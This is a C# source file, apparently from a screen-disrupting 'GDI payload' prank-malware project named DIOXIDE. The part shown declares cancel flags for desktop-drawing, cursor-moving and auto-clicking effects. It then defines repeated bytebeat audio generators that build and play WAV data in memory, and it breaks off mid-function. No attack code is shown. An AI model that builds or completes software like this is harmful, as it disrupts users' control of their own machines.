using System;
using System.Media;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.Drawing.Design;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using static DIOXIDE.Win32API;
using static DIOXIDE.Functions;
using static DIOXIDE.main;
using static DIOXIDE.color;

namespace DIOXIDE
{
    unsafe public static class payloads
    {
        public static IntPtr hwnd = GetDesktopWindow();
        public static IntPtr hdc = GetWindowDC( payloads.hwnd );

        public static int gdi1_cancel = 0;
        public static int gdi2_cancel = 0;
        public static int gdi3_cancel = 0;
        public static int gdi4_cancel = 0;
        public static int gdi5_cancel = 0;
        public static int gdi6_cancel = 0;
        public static int gdi7_cancel = 0;
        public static int gdi8_cancel = 0;
        public static int gdi9_cancel = 0;
        public static int gdi10_cancel = 0;
        public static int gdi11_cancel = 0;
        public static int gdi12_cancel = 0;
        public static int gdi13_cancel = 0;
        public static int gdi14_cancel = 0;
        public static int gdi15_cancel = 0;
        public static int gdi16_1_cancel = 0;
        public static int gdi16_2_cancel = 0;
        public static int gdi16_3_cancel = 0;
        public static int gdi16_4_cancel = 0;
        public static int gdi17_cancel = 0;
        public static int gdi18_cancel = 0;
        public static int gdi19_cancel = 0;
        public static int gdi20_cancel = 0;
        public static int gdi21_cancel = 0;
        public static int gdi22_cancel = 0;
        public static int gdi23_cancel = 0;
        public static int gdi24_cancel = 0;
        public static int gdi25_cancel = 0;
        public static int gdi26_cancel = 0;
        public static int gdi27_cancel = 0;
        public static int gdi28_cancel = 0;
        public static int gdi29_cancel = 0;
        public static int gdi30_cancel = 0;
        public static int gdi31_cancel = 0;
        public static int cursor_movement_cancel = 0;
        public static int Clicker_cancel = 0;
        public static int drawCursor_cancel = 0;

        public static int x = Screen.PrimaryScreen.Bounds.Width;
        public static int y = Screen.PrimaryScreen.Bounds.Height;
        public static int x2 = Screen.PrimaryScreen.Bounds.Left;
        public static int y2 = Screen.PrimaryScreen.Bounds.Top;
        public static int xc = Screen.PrimaryScreen.Bounds.Right - Screen.PrimaryScreen.Bounds.Left;
        public static int yc = Screen.PrimaryScreen.Bounds.Bottom - Screen.PrimaryScreen.Bounds.Top;

        public static Random r = new Random();

        public static void Sound1()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align

                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] =
((byte)((t | (t >> 9 | t >> 7)) * t & (t >> 11 | t >> 9)));

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound2()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align

                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] =
((byte)((t & t >> 12) * (t >> 4 | t >> 8)));

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound3()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align

                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] =
((byte)(t * ((t >> 9 | t >> 13) & 25 & t >> 6)));

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound4()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align

                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)((t * (t >> 11 & t >> 8 & 123 & t >> 3)));

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound5()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align

                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                     ((t << 1) ^ ((t << 1) + (t >> 7) & t >> 12)) | t >> (4 - (1 ^ 7 & (t >> 19))) | t >> 7
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound6()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       (63 & t * 3 & t >> 7) | (63 & t - 10 & t >> 10) - t % 30
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound7()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       (t & t % 255) - (t * 3 & t >> 13 & t >> 6)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound8()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                        t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound9()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                        (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound10()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                        ((t - (t >> 4 & t >> 8) & t >> 12) - 1)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound11()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       (((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound12()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                        ((t & (t >> 7 | t >> 8 | t >> 16) ^ t) * t)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound13()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                        ((t * t / (1 + (t >> 9 & t >> 8))) & 128)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound14()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       (t >> 5 | (t >> 2) * (t >> 5))
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound15()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11))
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound16()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       t & 5 * t | t >> 6 | (t & 32768 - 6 * t / 7 | (t & 65536 - 9 * t & 100 | -9 * (t & 100)) / 11)
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound17()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                       ((t >> 10) + 42) * 23 * t
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound18()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
((t >> 10) + 42) * 23 * t - 100 + t >> 1 * 2 / 5
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

